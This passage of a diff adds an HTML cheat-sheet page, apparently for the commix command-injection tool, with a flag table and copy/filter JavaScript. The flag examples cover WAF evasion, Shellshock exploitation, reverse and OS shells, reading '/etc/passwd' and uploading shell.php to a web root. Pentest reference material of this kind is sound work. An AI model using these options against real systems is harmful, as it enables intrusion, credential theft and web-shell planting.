+          <tr><td class="flag-col">--retries</td><td class="desc-col">Retry failed requests</td><td class="example-col">3</td><td><span class="badge badge-cyan">request</span></td></tr>
+          <tr><td class="flag-col">--delay</td><td class="desc-col">Delay between requests (secs)</td><td class="example-col">2</td><td><span class="badge badge-amber">evasion</span></td></tr>
+          <tr><td class="flag-col">--technique</td><td class="desc-col">Injection technique (C/T/F)</td><td class="example-col">C, T, F, CT</td><td><span class="badge badge-purple">technique</span></td></tr>
+          <tr><td class="flag-col">--prefix</td><td class="desc-col">Payload prefix string</td><td class="example-col">"')"</td><td><span class="badge badge-purple">technique</span></td></tr>
+          <tr><td class="flag-col">--suffix</td><td class="desc-col">Payload suffix string</td><td class="example-col">"-- -"</td><td><span class="badge badge-purple">technique</span></td></tr>
+          <tr><td class="flag-col">--tamper</td><td class="desc-col">Tamper script(s)</td><td class="example-col">space2ifs</td><td><span class="badge badge-amber">evasion</span></td></tr>
+          <tr><td class="flag-col">--skip-waf</td><td class="desc-col">Disable WAF detection</td><td class="example-col">—</td><td><span class="badge badge-amber">evasion</span></td></tr>
+          <tr><td class="flag-col">--chunked</td><td class="desc-col">Chunked transfer encoding</td><td class="example-col">—</td><td><span class="badge badge-amber">evasion</span></td></tr>
+          <tr><td class="flag-col">--shellshock</td><td class="desc-col">Shellshock exploitation mode</td><td class="example-col">—</td><td><span class="badge badge-red">exploit</span></td></tr>
+          <tr><td class="flag-col">--os-shell</td><td class="desc-col">Interactive OS shell</td><td class="example-col">—</td><td><span class="badge badge-red">exploit</span></td></tr>
+          <tr><td class="flag-col">--os-cmd</td><td class="desc-col">Single OS command</td><td class="example-col">"id"</td><td><span class="badge badge-red">exploit</span></td></tr>
+          <tr><td class="flag-col">--reverse-shell</td><td class="desc-col">Connect-back shell</td><td class="example-col">—</td><td><span class="badge badge-red">exploit</span></td></tr>
+          <tr><td class="flag-col">--file-read</td><td class="desc-col">Read remote file</td><td class="example-col">"/etc/passwd"</td><td><span class="badge badge-red">exploit</span></td></tr>
+          <tr><td class="flag-col">--file-write</td><td class="desc-col">Upload local file</td><td class="example-col">shell.php</td><td><span class="badge badge-red">exploit</span></td></tr>
+          <tr><td class="flag-col">--file-dest</td><td class="desc-col">Remote destination path</td><td class="example-col">"/var/www/s.php"</td><td><span class="badge badge-red">exploit</span></td></tr>
+          <tr><td class="flag-col">--web-root</td><td class="desc-col">Server web root path</td><td class="example-col">"/var/www/html"</td><td><span class="badge badge-red">exploit</span></td></tr>
+          <tr><td class="flag-col">--time-sec</td><td class="desc-col">Time-delay for blind (secs)</td><td class="example-col">5</td><td><span class="badge badge-purple">technique</span></td></tr>
+          <tr><td class="flag-col">--batch</td><td class="desc-col">Non-interactive auto mode</td><td class="example-col">—</td><td><span class="badge badge-green">core</span></td></tr>
+          <tr><td class="flag-col">--flush-session</td><td class="desc-col">Clear session cache</td><td class="example-col">—</td><td><span class="badge badge-green">core</span></td></tr>
+          <tr><td class="flag-col">-v</td><td class="desc-col">Verbosity level</td><td class="example-col">0-4</td><td><span class="badge badge-green">core</span></td></tr>
+          <tr><td class="flag-col">--output-dir</td><td class="desc-col">Save results to directory</td><td class="example-col">/tmp/out</td><td><span class="badge badge-green">core</span></td></tr>
+          <tr><td class="flag-col">--update</td><td class="desc-col">Update commix to latest</td><td class="example-col">—</td><td><span class="badge badge-green">core</span></td></tr>
+          <tr><td class="flag-col">--force-ssl</td><td class="desc-col">Force HTTPS connections</td><td class="example-col">—</td><td><span class="badge badge-cyan">request</span></td></tr>
+          <tr><td class="flag-col">--ignore-redirects</td><td class="desc-col">Don't follow HTTP redirects</td><td class="example-col">—</td><td><span class="badge badge-cyan">request</span></td></tr>
+          <tr><td class="flag-col">--level</td><td class="desc-col">Test depth (1-3)</td><td class="example-col">2</td><td><span class="badge badge-purple">technique</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<script>
+function switchTab(name) {
+  document.querySelectorAll('.panel-inner').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.getElementById('pane-' + name).classList.add('active');
+  event.target.classList.add('active');
+}
+
+function cp(btn) {
+  const block = btn.closest('.cmd-block');
+  const text = block.querySelector('.cmd-text').textContent.replace(/# .*/g,'').trim();
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'done!';
+    setTimeout(() => btn.textContent = 'copy', 1200);
+  });
+}
+
+function filterCmds(q, paneId) {
+  const pane = document.getElementById(paneId);
+  const blocks = pane.querySelectorAll('.cmd-block, .technique-card');
+  q = q.toLowerCase();
+  blocks.forEach(b => {
+    b.style.display = (b.textContent.toLowerCase().includes(q) || q === '') ? '' : 'none';
+  });
+}
+
+function filterTable(q) {
+  const rows = document.querySelectorAll('#flag-table tbody tr');
+  q = q.toLowerCase();
+  rows.forEach(r => {
+    r.style.display = r.textContent.toLowerCase().includes(q) ? '' : 'none';
+  });
+}
+</script>
